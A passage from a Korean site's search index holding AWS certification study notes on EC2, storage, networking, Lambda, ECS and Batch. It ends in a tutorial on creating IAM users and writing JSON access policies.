데이터베이스를 선택 탄력성과 확장성을 갖춘 솔루션을 설계      안전한 애플리케이션 및 아키텍처 설명  어떻게 애플리케이션 티어를 보호할지를 결정 어떻게 데이터를 보호할지 결정   비용에 최적화된 아키텍처 설계  어떻게 비용에 최적화된 스토리지를 설계할지를 결정 어떻게 비용에 최적화된 컴퓨팅을 설계할지 결정       EC2 인스턴스    EC2는 물리 서버의 기능을 함축적으로 가상화한 실제 서버와 유사하게 작동\n  스토라지, 메모리, 네트워크 인터페이스가 새로 설치 된 기본 드라이브가 제공\n     EC2 Amazon Machin Image ( AMI )   AMI란 EC2를 시작할 때, 루트 볼륨에 설치될 운영 체제와 소프트웨어를 기술한 템플릿 문서 AMI의 종류     종류 설명     Amazon 바른 시작 AMI 자주 이용되는 Linux, Windows 등이 등록되어지고, 최신 버전으로 업데이트, 공식적으로 지원하는 이미지   AWS Marketplace AMI AWS Marketplace AWS에서 공식적으로 지원하는 이미지이며, SAP, 시스코와 같은 공급업체가 제공 및 지원   Community AMI 100.000개 이상의 이미지가 제공디고 있으며, 특정한 요구에 맞게 커스터마이징 된 이미지   Private AMI 사용자가 자체 배포한 인스턴스에서 이미지를 생성해서 저장한 이미지, S3에 저장할 수 있으며, 이를 통해 As기능을 사용할 수 있다.       EC2 Instacne Type   AWS는 사용자가 선택한 하드웨어 프로파일, 즉 인스턴스 유형에 따라 하드웨어 리소스를 인스턴스에 할당한다. AWS를 이용하는 사용자는 자신의 니즈에 맞게 인스턴스의 유형을 사용함으로써 자원을 효율적으로 이용할 수 있다. 인스턴스의 유형은 자주 변경되며 AWS Instance Type에서 확인할 수 있다. EC2 인스턴스 유형 패밀리와 최상위 명칭     인스턴스 유형 패밀리 유형     범용 T3, T2, M5, M4   컴퓨팅 최적화 C5, C4   메모리 치적화 X1e, X1, R5, R4, z1d   가속화된 컴퓨팅 P3, P2, G3, F1   스토리지 최적화 H1, l3,D2      범용 서비스 : 컴퓨팅, 메모리, 네트워크, 리소스를 균형 있게 제공하며, 리소스의 확장이 쉽다. M5, M4 : 주로 중소 규모 데이터 운영에 권장되며, M 인스턴스는 실제 호스트 서버에 물리적 연결된 내장 인스턴스 스토리지 드라이브와 함께 제공 컴퓨팅 최적화 : 대규모 요청을 받는 웹 서버와 고성능 머신 러닝 워크로드에 적합 메모리 최적화 : 처리량이 많은 데이터베이스, 데이터 분석, 캐싱 작업에 유용 가속화된 컴퓨팅 : 고성능 범용 그래픽 처리 장치(GPGPU)가 제공되어, 3D 시각화/ 렌더링, 재무 분석, 전산 유체역학 같은 고부하 워크로드 인스턴스에 적합 스토리지 최적화 : 지연시간이 짧은 대용량 인스턴스 스토리지 볼륨을 사용     AWS Region   사용자는 AWS의 데이터 센터의 서버를 이용할 것이며, 이는 지리적 리전으로 구성되어 있다. EC2 리소스느 사용자가 선택한 리전에서만 관리할 수 있으며, 각 리전에 따라 서비스와 기능은 물론 비용도 다르므로 최신 공식 문서를 확인해야한다.     Virtual Private Cloud ( VPC )   VPC는 사용자가 사용할 네트워크 내부대역을 생성하는 것으로, 프로젝트 단위로 작업을 허용하기 유용하다. 다중 VPC를 생성해도 금액이 발생하지 않으며, NATgateway, VPN 서비스를 사용하는 경우에는 비용이 발생된다.     태넌시   EC2 인스턴스를 시작할 때, 테넌시 모델을 선택할 수 있다. 기본 설정은 공유 테넌시이며, 여러 인스턴스가 한 물리 서버에서 동시에 가상 머신으로 실행된다.     인스턴스 동작 구성   인스턴스를 생성할 때, 이를 부트스트랩이라 하며, 스크립트 파일을 작성하거나, CLI에서 user-data 값을 사용하면 필요한 상태로 인스턴스를 구성할 수 있다.     인스턴스 요금   세 가지 모델 중에서 하나를 선택해 EC2 인스턴스를 구매해서 사용할 수 있다.     요금 모델 설명     온 디맨드 사용자가 사용한 만큼만 비용이 발생하게 구성   예약 미리 사용량을 할당받아 정해진 만큼 지불하며, 1, 3년으로 구성   스팟 특정 리전에서 실행되는 인스턴스 유형에 대해 사용자가 최대 입찰 요금을 입력해서 인스턴스를 사용       리소스 태그   AWS 계정에 리소스를 다수 배포할수록 추적이 어려워진다. 또한 다수의 VPC, 보안 그룸, 볼륨 등과 연계되면 복잡성은 한 층 더 강해진다. 이를 위해 AWS 계정에서는 리소스를 빠르게 식별할 수 있도록 리소스마다 목적 및 다른 리소스와의 관계 등을 정리할 수 있다. 리소스 태그는 키/ 값으로 구성된다.     키 값     production-server server1   production-server security-grouop1   staging-server server1   test-server security-grouop1       서비스 할당량   한 리전당 생성할 수 있는 VPC의 수는 5개 허용된 키 페어의 수는 5.000개 그 외의 추가적인 제한은 AWS 최신 할당량 정보     EC2 Storage Voulme   볼륨은 스토리지 드라이브로, 물리 드라이브를 가상으로 나눈 공간을 의미한다. AWS에서는 여러 유형의 볼륨 드라이브가 있으며, 각 유형이 동작하는 방식이 달라 이해가 필요하다.     Elastic Block Store Volume ( EBS )   EBS는 필요한 수 만큼 인스턴스에 연결할 수 있으며, 물리 서버의 하드 드라이브, 플래시 드라이브, USB 드라이브와 유사하게 사용된다. 물리 드라이브에서와 같이 어떤 EBS 볼륨 유형을 선택하느냐에 따라 성능과 비용은 달라진다. AWS SLA에서 99.999%의 가용성으로 충분한 안정성을 가지고 있다. EBS의 볼륨 유형     볼륨 타입 설명     EBS 프로비저닝 된 IOPS SSD 고성능 I/O 작업이 필요할 때 최대 32.000 IOPS와 최대 500MB/s 처리량을 제공한다.   EBS 범용 SSD 대다수 일반 서버 워크로드에서 사용되며, 이론적으로 짧은 징녀 시간 성능을 제공한다.   처리량 최적화 HDD 로그 처리와 빅 데이터 작업 등의 높은 처리량을 요구하는 워크로드에 적합한 성능을 저렴한 비용에 제공한다.   콜드 HDD 번번하게 엑세스하지 않는 대용량 작업에 콜드 HDD는 가장 낮은 가격에 제공한다.       EBS 볼륨 기능   모든 EBS 볼륨은 스냅샷을 통해 복사할 수 있고, 기존 스냅샷을 다른 인스턴스에 공유해서 연결할 수 있으며, AMI로 등록할 수 있는 이미지로 변경할 수 있다. EBS 볼륨은 암호화해서 EC2 인스턴스가 저장하거나 송수힌 하는 데이터를 보호할 수 있으며, EBS에서는 내부에서 암호화 키를 자동으로 관리하거나 AWS KMS에서 제공되는 키를 사용할 수 있다.     인스턴스 스토어 볼륨   인스턴스 슽어 볼륨은 EBS 볼륨과는 다른 임시 디스크로, 디스크가 연결된 인스턴스가 종료되었을 때, 영구히 삭제된다. EBS 대신 인스턴스 스토어 볼륨을 사용하는 경우는 다음과 같다.  인스턴스 스토어 볼륨은 인스턴스를 호스팅하고 있는 서버에 물리적 고속 NVMe 인터페이스로 연결된 SSD이다. 인스턴스 스토어 볼륨 요금은 인스턴스 요금에 포함되어 있다. 인스턴스 스토어 볼륨은 단기 역할 수행이나 외부에서 데이터를 가져와서 처리 후, 폐기하는 배포 모델에 적합하다.       EC2 인스턴스 엑세스   EC2 인스턴스는 네트워크에 연결된 모든 장치와 마찬가지로 고유한 IP로 식별 네트워크 인스턴스의 범위      처음 주소 끝 주소     10.0.0.0 10.255.255.255   172.16.0.0 172.31.255.255   192.168.0.0 192.168.255.255     프라이빗 서브넷으로 생성된 인스턴스는 서브넷 내부에서만 통신할 수 있고, 인터넷에는 직접 연결할 수 없다. 다른 리소스와 연결등의 필요로 인스턴스에 여러 네트워크 인터페이스가 있어야 하는 경우, 하나 이상의 가상 탄력적 네트워크 인터페이스를 만들어 연결할 수 있다.     EC2 인스턴스 보안   사용자에게는 무단으로 EC2 인스턴스가 사용되지 않도록 적절하고 효과적으로 엑세스 제어를 구성해야할 책임이 있다. AWS는 이를 위해 보안 그룹, IAM 역할, NAT 인스턴스, 키 페어 등 네 가지 도구를 지원한다.     보안그룹   EC2 보안 그룹은 방화벽 역할을 한다. 보안 그룹의 기본 설정은 수신하는 모든 트래픽을 거부하며, 보안 그룹에 지정한 트래픽 유형만을 허용하는 정책 규칙을 설정한다. 보안그룹은 트래픽 유형만을 허용하는 정책 규칙을 설정하며, 네트워크에서 송수신하느 모든 데이터 패킷은 그 규칙에 따라 평가해서 허용 및 거부된다.     IAM   IAM이란 루트 계정이 아닌, 다른 사용자를 생성하여 역할(권한)을 부여함으로써, 사용가능한 범위를 분리시키는 것 IAM 역할을 사용해서 EC2 인스턴스를 비롯한 AWS 리소스에 엑세스 하는 것에 대한 제어가 가능     NAT 디바이스   인터넷이 항상 필요한 것이 아닌, 업데이트 등의 주기적으로 필요할 때만 인스턴스에 인터넷을 연결하도록 하는 서비스 NAT 게이트 웨이 or NAT 인스턴스로 프라이빗 게이트웨이를 지정함으로써 사용할 수 있다.     키 페어   키 페어는 암호화방식으로 키 값을 생성 후, 페어에 맞는 키만이 인스턴스의 접속이 가능하도록 한다.     기타 EC2 서비스  AWS System Manager   System Manager은 AWS 클라우드와 온프레미스 인프라를 운영하는 리소스를 모니터링 및 관리하기 위한 도구의 모음     배치 그룹   배치 그룹은 지연 시간이 짧은 네트워크 상호 연결이 필요한 여러 EC2 인스턴스에 효율적으로 사용된다. 클러스터 그룹은 단일 가용 영역 안에서 물리적으로 접근 및 서로 연결된 인스턴스로 시작 분산형 그룹은 장애 관련 데이터나 서비스 손실 윟머을 줄이기 위해 물리적으로 분리된 하드웨어 인스턴스를 분산     AWS Elastic Container Service와 AWS Fargate   대규모 Docker 컨테이너 기반에서 실행되는 애플리케이션은 본질적으로 AWS와 같은 플랫폼에 적합 미리 사용된 미리 구축된 Docker를 사용하여 다른 AWS 서비스와 연계하여 사용할 수 있음     AWS Lambda   서버리스 애플리케이션은 프로그래밍 코드 기반으로 실행 서버에서 동작하지만 사용자가 서버를 제어하는 대신, 사전 설정된 이벤트로 Lambda 서버를 트리거해서 코드를 실행 및 구성     VM Import/ Export   Local의 VMware 이미지를 S3를 통해 AWS상에서 사용할 수 있게 하는 서비스     Elastic Load Balancing과 Auto Scaling   로드 밸런서는 효율적으로 트래픽을 관리하고 여러 EC2 인스턴스에 전송해 서버 리소스를 효율적으로 분산하여 사용하는 서비스     2장 요약    Amazon머신 이미지 ( AMI )를 선택하고 시작할 때 스크립트나 user data를 입력해서 EC2의 기본 소프트웨어 스택을 정의\n  인스턴스 유형으로 하드웨어 프로파일을 정하며, 태넌시 설정으로 다른 인스턴스와 물리적 호스트를 공유할 것인지를 결정\n  EC2 인스턴스를 비롯한 모든 AWS 리소스에 시스템 전반의 명명 규칙에 따라서 쉽게 식별할 수 있게 태그를 부여할 수 있다.\n  리소스의 제한이 있으머, 할당량을 넘는 리소스를 생성할 때에는 추가적인 신청을 해야한다.\n  1년 이상 인스턴스를 실행할 때, 온디매드 대신 예약 인스터느를 구매하며 크게 비용을 절약할 수 있다.\n  서비스가 끊끼는 게 중요하지 않은 경우, 스팟 인스턴스를 사용하는 것이 합리적이다.\n  EBS에는 4가지 볼륨 유형이 있다.\n  높은 IOPS와 짧은 지연 시간을 지원하는 두 가지 SSD 유형과 두 가지 기존 하드 디스크 드라이브 유형이 있다.\n  볼륨 선택은 워크로드와 예산에 따라 결졍되며, 인스턴스 유형에는 임시 인스턴스 스토어 볼륨이 사용된다.\n  일부 EC2 인스턴스 유형에는 임시 인스턴스 스토어 볼륨이 사용되는 데, 스토어 볼륨은 데이터 엑세스는 빠르지만 인스턴스가 종료되면 데이터가 종료된다.\n    모든 EC2 인스턴스는 최소 하나의 프라이빗 주소를 가지고 있으며, 인터넷 엑스세가 필요하면 임시 퍼블릭 IP 주소를 할당한다.\n  EIP를 통해 영구적인 IP를 할당할 수도 있다.\n  EC2 인스턴스를 보호하기 위해서 보안 그룹이라고 하는 소프트웨어 방화벽으로 액세스를 허용하거나 차단하고, IAM 역할, NAT 인스턴스/ 게이트웨이, 키 페어 등이 사용된다.\n     시험핵심    EC2 인스턴스를 프로비저닝하고 시작하는 방법을 이해한다.\n  워크로드에 적합한 하드웨어/ 소프트웨어 프로파일을 선택 방법을 이해한다.\n  EC2 요금 모델과 필요에 맞는 요금 선택 방법을 이해한다.\n  배포 프로파일에 맞게 보안과 액세스의 균형을 조절해서 보안 그룹을 구성하는 방법을 이해한다.\n  실행 중인 인스턴스에 액세스하는 방법을 이해한다.\n  스토리지 볼륨 유형의 기능과 작동을 이해한다.\n  스토리지 볼륨에서 스냅샷 생성 방법과 다른 인스턴스에 스냅샷을 연결하는 방법을 파악한다.\n    "}),a.add({id:50,href:'/docs/aws/amazonwebservice/aws_computing/',title:"AWS Computing",content:"AWS 컴퓨팅 서비스   EC2 ( Elastic Compute Cloud )   EC2 공식 홈페이지 가상 컴퓨팅 서비스를 제공해주는 서버로 실제 물리서버와 똑같은 형태의 서비스를 제공 AMI를 통해 필요한 운영체제와 여러 소프트웨어를 쉽게 생성 가능 키 페어를 사용하여 로그린 정보 보호 SSH로 원격 연결이 가능 중지가 가능한 EBS 기반 인스턴스와 임시 스토리지를 제공하여 중지가 불가능한 Instance Store 기반 EC2로 분류 됨 ( 재부팅은 모두 가능 ) 인스턴스의 유형으로는 범용, 컴퓨팅 최적화, 메모리 최적화, 스토리지 최적화 등이 존재   EC2 상태의 종류  Pending : 인스턴스가 구동하기 위해 준비중인 상태, 요금 미청구 Runnung : 인스턴스가 실행하고 사용할 준비가 된 상태, 요금 청구 Stopping : 인스턴스가 중지 모드로 전환되려는 상태, 요금 미청구 Shutting-down : 인스턴스가 종료를 위해 준비중인 상태, 요금 미청구 Terminated : 인스턴스가 종료된 상태, 요금 미청구   EC2 구매옵션  On demand : 필요할 때 바로 생성하는 방식으로 1시간 단위로 과금이 이루어짐 ( 1분 사용시도 1시간 ) Spot : 경매방식의 인스턴스 기준가격보다 높은 가격 제시시 사용가능하며, 타인에 의해 불시로 종료되거나 정지될 수 있어 각종 테스트에 적합 Reserved : 12개월- 36개월 단위로 예약하여 사용하는 인스턴스로 On demandq비해 가격이 대폭 할인되며, 장기적으로 사용할 경우 효율이 좋지만, 예약된 인스턴스이기에 사용하지 않아도 과금이 부과되어짐    Lightsail   Lightsail Site AWS에서 VPS ( Virtual Private Server : 가상 사설 서버 ) 를 시작하는 가장 쉽고 빠른 방법 가상 사설 서버, 영구적인 스토리지, 네트워킹을 포함 클릭 한 번으로 모든 과정을 생략, 쉽게 VPS를 생성 및 관리 확장가능 및 타 AWS Services에 접근 가능 고가용성 어플리케이션 생성 가능 저렴하고, 비용의 예측이 보다 쉬움 완전히 사전구성되어 있는 서버 ( BluePrint )   Lightsail의 유료 Plan  월간 무료 데이터 허용량 초과시, 퍼블릭 IP 주소를 사용ㅎ여 요금 청구 Lightsail 스냅샷 비용 : 인스턴스 스냅샷 + 디스크 스냅샷 1시간 이상 인스턴스에 연결되어 있지 않은 고정 IP ( Elastic IP ) 무료로 주어지는 3백만 개의 쿼리를 초과하는 경우   Lightsail\u0026amp; EC2  Lightsail의 주 사용용도  웹 사이트 및 블로그 단순 앱 개발 및 테스트 환경 소수의 서버로 구성된 비즈니스 소프트웨어   EC2  빅데이터 분석 고성능 컴퓨팅 과학 분야 컴퓨팅 멀티\u0026rsquo;티어 애플리케이션      ECS ( Elastic Container Service )   AWS의 Virtual Machine, VM (가상 머신) 가상의 컴퓨터, 하나의 호스트에 안에 또다른 호스트를 만들어 사용하는 것 CPU, Memory와 같은 주요 하드웨어 부품을 소프트웨어로 완전 재현해내어 기능을 흉내내게 하고(에뮬레이션), 격리된 실행 환경(OS)를 만듬 즉 하드웨어를 직접 가상화 클러스터에서 도커 컨테이너를 손쉽게 관리하기 위해 컨테이너 관리 서비스 클러스터는 Task(작업) 또는 서비스로 일컬어지는 컨테이너들의 집합    2가지 구성 요소로 시작 가능  EC2(Container Instance) : EC2를 생성하여 EC2 내에 Task(컨테이너가 수행할 작업) Fargate : EC2를 생성하거나 컨테이너를 실행하기 위한 Orchestration을 AWS가 맡아 하는 서비스로, 관리가 용이함   하나의 클러스터 내에 다수의 Task 혹은 컨테이너 인스턴스로 구성됨 또한 ELB, EBS 볼륨, VPC, IAM과 같은 기능을 사용하여 구성 가능 즉 ECS 각 작업의 권한, ECS 액세스를 IAM으로 조절하거나, EC2 유형의 컨테이너 인스턴스만이 OS에 액세스 가능한 특징 등을 갖게 됨 호스트의 OS(Operating System) 내에 또다른 실행환경의 OS가 존재함 윈도우 OS의 호스트 내에 리눅스, 우분투 등의 다양한 OS를 올릴 수 있음 다만 OS를 포함하기 때문에 용량을 많이 차지할 뿐더러, 사용자가 필요치 않는 기능까지 포함할 수 있으며 느림   Linux Container  ECS를 사용하는 목적이자 관리 대상 하드웨어가 아닌 OS를 가상화하여 커널을 공유하며 프로세스(컨테이너와 비슷)를 격리된 환경에서 실행하는 것 VM와 달리 달리 호스트의 OS에서 가상화를 실시하여, 이 OS 위에 프로세스들이 ‘컨테이너’로서 격리된 환경에서 실행됨 호스트의 입장에선 컨테이너는 프로세스에 불과하지만, 컨테이너 입장에서는 독립된 실행환경임 OS를 포함하지 않는만큼 가볍고, 하드웨어를 가상화하지 않기 때문에 빠름   Kernel  Operaintg System에서 가장 중요한 역할을 맡고 있는 핵심(核心) 커널이 각 프로세스(실행환경)에 하드웨어 자원(CPU 등)을 할당하고, 작업 스케쥴링(처리순서)를 담당하며, 프로세스 간 접근과 보안을 책임짐 과거에 커널이 없던 시절에도 컴퓨터는 존재할 수 있었으나 메모리를 초기화하기 위해서는 컴퓨터를 리부팅해야 하는 등, 자원관리/제어 주체의 필요성에 의해 탄생   Docker  앞서 설명한 Linux Container 기술에 근간을 두는 오픈소스 컨테이너 프로젝트 ‘Docker’라는 단어 자체가 ‘부두에서 일하는 노동자’, 즉 컨테이너를 관리하는 존재임을 뜻함 Linux Container 기술을 사용하는 솔루션이므로 별도의 OS를 설치하지 않고 컨테이너를 생성하여 애플리케이션을 실행함 컨테이너를 생성할 이미지(서비스에 필요한 리소스를 모아둔 최소한의 단위)를 기반으로 운영함 이미지만 가지고 있다면 어느 시점에서든 동일한 리소스의 컨테이너를 생성할 수 있음 그 밖에 컨테이너간의 연결, 다양한 API 제공 등의 기능을 보유    Lambda   Serverless Service 서버를 구축, 프로비져닝하고 필요한 패키지를 설치하는 등의 과정을 거치지 않고, 코드를 실행하는 서비스 사용자는 애플리케이션이나 백엔드 서비스를 관리할 필요 없이 코드를 실행할 수 있음 CloudWatch, ALB, DynamoDB 등을 트리거로 이용하여 특정 상황에서 코드를 실행시키고 것이 가능 API Gateway와 Lambda를 조합하여 요청별로 특정 코드를 수행하도록 구성 가능 15분을 초과하는 작업에 대해서는 Lambda 비적합   Lamda Function의 정의와 구성  코드를 실행하기 위해 호출할 수 있는 리소스 이벤트를 처리하는 코드, 계층, 트리거, 전달 대상 등으로 구성됨  함수코드 : 실제 호출되기 실행되는 코드, Runtime(코드 실행지원), IAM, VPC, Memory 등으로 구성됨 트리거 : 함수코드를 발동시키는 서비스(S3, SNS, SQS, DynamoDB, CloudWatch Event, Cloudwatch Log 등)   SNS의 메시지 구독 대상에 Lambda를 포함시키면, 메시지 발송시 Lambda가 이를 전달받고 함수코드 실행  전달대상 : 함수가 비동기식으로 호출되거나, 레코드를 처리한 경우 전달될 대상   SNS, SQS, 또다른 Lambda, EventBridge 이벤트 버스로 전달가능 NS로부터 메시지를 전달받아 코드를 처리하고 이를 SQS로 보내 메시지 대기열에 적재할 수 있음   EC2 vs Lambda  EC2 사용시 프로비져닝, 운영 체제, 네트워크 세부 설정, 보안 설정 등을 사용자가 원하는 방향으로 지정 가능 Lambda 사용시 프로비져닝 필요없이 AWS가 모니터링, 프로비져닝, 보안패치 적용, 코드 배포를 모두 수행함    Batch   종합 관리형 서비스 한 리전 내의 여러 가용 영역에 걸쳐 배치 작업을 실행하는 과정을 간소화하는 리전 서비스 새 VPC 또는 기존 VPC에서 컴퓨팅 환경을 생성할 수 있음 AWS Batch를 사용하면 AWS 클라우드에서 배치 컴퓨팅 워크로드를 실행이 가능  배치 컴퓨팅 : 다수의 사람들이 수 많은 컴퓨터 리소스에 엑세스 할 때 일반적으로 사용하는 방법     AWS Batch의 구성요소  작업  AWS Batch에 제출한 작업 단위 ( 쉘 스크립ㅌ, Linux 실행 파일, Docker 컨테이너 이미지 ) 작업에는 이름이 있으며, 파라미터를 사용하여 컴퓨팅 환경의 인스턴스에서 컨테이너화된 애플리케이션으로 실행   작업 정의  작업이 실행되는 방식을 지정하며 작업에 있는 리소스에 대한 블루프린트를 의미 IAM 역할을 제공하여 다른 AWS 리소스에 프로그래밍 방식으로 엑세스할 수 있으며 메모리 및 CPU 요구 사항을 모두 지정가능   작업 대기열  AWS Batch 작업이 대기열 예약되는 환경 우선 순위 갑 및 작업 대기열 전체에 우선 순위 할당 가능   컴퓨팅 환경  작업을 싱해하는 데 사용되는 관리형 또는 비관리형 컴퓨팅 리소스 세트 여러 세부 수준에서의 인스턴스 유형의 설정이 가능     Batch Group  클러스터 : 인스턴스를 AZ 내에서 근접하게 배치, 결합된 노드 간 낮은 지연 시간의 네트워크 달성 가능 파티션 : 인스턴스가 담긴 그룹을 논리 세그먼트로 나누어 각 파티션에 배치, 최대 7개의 파티션을 가질 수 있으며, 각 파티션은 자체 랙 세트를 보유하고 자체 네트워크 전원을 보유 분산 : 파티션이 논리 세그먼트로 분리된 인스턴스 그룹인 것과 달리 분산은 인스턴스 개체 하나가 자체 랙에 분산 배치됨, AZ당 최대 7개의 인스턴스 배치 가능    Elastic Beanstalk   Java, NET, PHP, Node js, Python, Ruby, Go, Docker을 사용하여 Apache, Nginx, Passenger, llS와 같은 친숙한 서버에서 개발된 웹 어플리케이션 및 서비스를 간편하게 배포하고 조정 할 수 있는 서비스 EC2, ASG, RDS 등 AWS 리소스들을 조합하여 완성된 어플리케이션 플랫폼으로 PaaS의 일종 오토 스케일링, 로브 밸런싱, 버전 관리 등의 기능을 콘솔에서 몇 번의 클릭으로 생성 가능 실제 서비스가 아니기에 사용 요금이 없음   Elastic Beanstalk의 장점  간단한 서버 세팅 환경변수들을 쉽게 변경/ 관리가 가능 오토 스케일링이 용이 로그의 자동화 추가요금이 없음 #  "}),a.add({id:51,href:'/docs/aws/awstraining/',title:"AWS Training",content:"Amazon Web Service Training AWS 시작하기 AWS 사용자 계정 생성 AWS CLI 활용 AWS 사용자 정의 VPC 생성 AWS EC2 생성 AWS AMI 생성 AWS Elastic IP 할당 AWS ELB ( 2 Tier ) 생성 AWS AutoScaling AWS RDS 생성 AWS 3Tier 구현 AWS S3 생성      "}),a.add({id:52,href:'/docs/aws/awstraining/iam/',title:"AWS 사용자 계정 생성",content:"AWS 사용자 계정 생성    AWS 사용자 계정 생성    이번 시간에는 AWS 계정생성에 이어 AWS 사용자 계정을 생성해보도록 하겠습니다. IAM이 무엇인지는 AWS IAM을 참고해주세요.      먼저 AWS에 로그인 후, IAM 서비스를 검색합니다.      IAM 서비스에 진입하여, 메뉴에서 사용자를 클릭합니다.      사용자 추가를 선택합니다.      사용자의 이름을 기입하고, 엑세스 유형을 선택합니다. AccesskeyId와 SecreKey는 AWS CLI, API, SDK 등 기타 개발 도구의 사용되며, Login url, Password 콘솔창의 로그인시 사용됩니다.       유형 AccessKeyId SecreKey Login url Password     프로그래밍 방식 O O X X   AWS Management Console Access 방식 X X O O         여기서는 프로그래밍 방식 및 AWS Console 방식을 모두 체크하겠습니다. 체크가 완료되면, 편하게 사용할 수 있도록, 직접 암호를 입력합니다.      다음으로 그룹에 사용자를 추가하기 위해 그룹을 생성합니다.      그룹에는 AdminstratorAccess ( 관리자 권한 ) 역할을 추가합니다. 이 역할에 대해서는 끝에서 다시 한번 다루겠습니다.      설정이 완료되면, 다음으로 진행하고, 마지막으로 사용자가 추가됨을 확인할 수 있습니다. 전에 선택한 엑세스 유형에 맞춰 csv 파일의 항목이 다르며, 두 가지를 전부 선택한 저는 엑세스 및 시크릿 키와 url이 전부 포함되어 있습니다. 여기서 다운받는 csv파일은 후에, 같은 값으로는 다운 받을 수 없으니, 삭제되지 않도록 잘 저장해야합니다.      url로 접속 후, 설정한 ID와 비밀번호를 입력하면 해당 User로 접속이 완료됩니다. 이를 통해 특정 유저에게 특정권한만을 주어, 해킹 및 실수 등을 예방 및 관리가 가능합니다.     IAM 정책 커스터마이징    IAM 계정을 생성하며, IAM 정책을 통해 생성그룹에 권한을 부여 했습니다. 그렇다면 IAM 정책을 커스터마이징할 수는 없을까요? 먼저, 정책은 json 파일 형식으로 되어 있으며, 이를 직접 만들기에는 까다로울 수 있지만, 있는 것을 복사한 뒤 수정하는 것은 그렇게 어렵지는 않습니다. ( 또한 최근에는 개념만 충분히 숙지하고 계시면 콘솔 창에서 클릭만으로도 가능합니다\u0026hellip; ) 이번에 이를 확인하여 보겠습니다.      먼저 IAM 서비스의 메뉴에서 정책을 선택합니다. 그 후, User 계정을 생성할 때 사용했던 AdminstratorAccess를 선택합니다.      그 후, 권한에서 { }json을 클릭 후 해당 내용들을 확인합니다.       옵션 Version Statment Effect Action Resource     의미 파일의 버전 파일 정책의 내용 허가 또는 거부 ( Allow or Deny ) 설정 대상 서비스와 대상 조작을 작성 설정 대상 리소스를 작성      즉, 여기에서는 \u0026ldquo;*\u0026rdquo; = 모든 대상 서비스와 대상에 대한 조작은 모두 허가한다는 것입니다. 이 의외에도 특정 IP에 대한 권한만을 주거나 할 수 있으며, 보다 자세한 사항은 IAM 정책 LINK을 참조하시길 바랍니다.      그럼 이번에는 직접 정책을 생성해보도록 하겠습니다. 다시 정책으로 돌아와, 상단의 정책생성을 클릭합니다.      상단을 보면, 시각적 편집기와 JSON 파일 형식을 확인할 수 있습니다. 여기서는 동일하게 S3에 대한 모든 권한을 가질 수 있는 정책을 생성해보도록 하겠습니다.      다음으로는 이름과 설명을 기입 후, 정책을 생성합니다.      정책이 생성되면, 정책 필터를 통해 확인이 가능합니다.      생성된 정책에 진입하면, 작성했던 Json파일의 내용을 확인할 수 있습니다.      다음으로는 다시 정책생성으로 돌아와 콘솔창을 통해 생성해 보도록 하겠습니다.   서비스 : S3\n작업 : 모든 S3 작업\n리소스 : 모든 리소스\n요청 조건 : 선택 안함\n     다시 이름과 설명을 기입 후, 정책을 생성합니다.      정책 필터를 통해 S3-User로 진입합니다.      Json형식으로 확인해보면, Sid를 제외한 값이 모두 동일함을 확인할 수 있습니다. 이를 통해, 콘솔이나 json파일을 통해 동일한 값으로 생성할 수 있음을 알 수 있었습니다. 이에 대한 확인을 IAM을 통해 새로운 계정을 생성 후, 생성한 권한을 주어, S3에 진입 후, bucket을 생성하거나, 혹은 생성해 둔 bucket을 통해 알 수 있습니다. ( S3 권한만을 주었기 때문에, 다른 서비스에 대한 이용은 불가능합니다. )     예제   예제 1. 관리자의 권한을 가졌지지만, 엑세스 ID와 비밀 엑세스 키만 가지고 있는 사용자를 만들어보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다.  \r\r\r    예제 2. 모든 EC2에 대한 읽기권한만을 가지고, 현재 IP만이 사용가능한 정책을 생성하세요.  \r예제 2. 답안\r↕\r\r 편집기 사용시   서비스 : EC2\n작업 : 읽기\n리소스 : 모든 리소스 요청조건 : 소스 IP ( 자신의 IP )\n   Json 사용시  { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;ec2:GetDefaultCreditSpecification\u0026#34;, \u0026#34;ec2:DescribeTags\u0026#34;, \u0026#34;ec2:GetCoipPoolUsage\u0026#34;, \u0026#34;ec2:DescribeVpnConnections\u0026#34;, \u0026#34;ec2:GetEbsEncryptionByDefault\u0026#34;, \u0026#34;ec2:GetCapacityReservationUsage\u0026#34;, \u0026#34;ec2:DescribeVolumesModifications\u0026#34;, \u0026#34;ec2:GetHostReservationPurchasePreview\u0026#34;, \u0026#34;ec2:DescribeFastSnapshotRestores\u0026#34;, \u0026#34;ec2:GetConsoleScreenshot\u0026#34;, \u0026#34;ec2:GetReservedInstancesExchangeQuote\u0026#34;, \u0026#34;ec2:GetConsoleOutput\u0026#34;, \u0026#34;ec2:GetPasswordData\u0026#34;, \u0026#34;ec2:GetLaunchTemplateData\u0026#34;, \u0026#34;ec2:DescribeScheduledInstances\u0026#34;, \u0026#34;ec2:DescribeScheduledInstanceAvailability\u0026#34;, \u0026#34;ec2:GetEbsDefaultKmsKeyId\u0026#34;, \u0026#34;ec2:DescribeElasticGpus\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;Condition\u0026#34;: { \u0026#34;IpAddress\u0026#34;: { \u0026#34;aws:SourceIp\u0026#34;: \u0026#34;자신의 IP\u0026#34; } } } ] } \r\r\r\r    예제 3. 예제 2에서 생성한 정책을 편집하여 RDS에 대한 모든 권한을 주는 정책을 생성하고, EC2에서의 IP제한에 대한 설정을 제거해보세요..  \r예제 3. 답안\r↕\r\r 예제 2에서 생성한 정책에 진입하여, 기존 정책을 편집   편집기 사용시   요청조건 : 소스 IP의 항목을 체크 제거\n   Json 사용시  { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;ec2:GetDefaultCreditSpecification\u0026#34;, \u0026#34;ec2:DescribeTags\u0026#34;, \u0026#34;ec2:GetCoipPoolUsage\u0026#34;, \u0026#34;ec2:DescribeVpnConnections\u0026#34;, \u0026#34;ec2:GetEbsEncryptionByDefault\u0026#34;, \u0026#34;ec2:GetCapacityReservationUsage\u0026#34;, \u0026#34;ec2:DescribeVolumesModifications\u0026#34;, 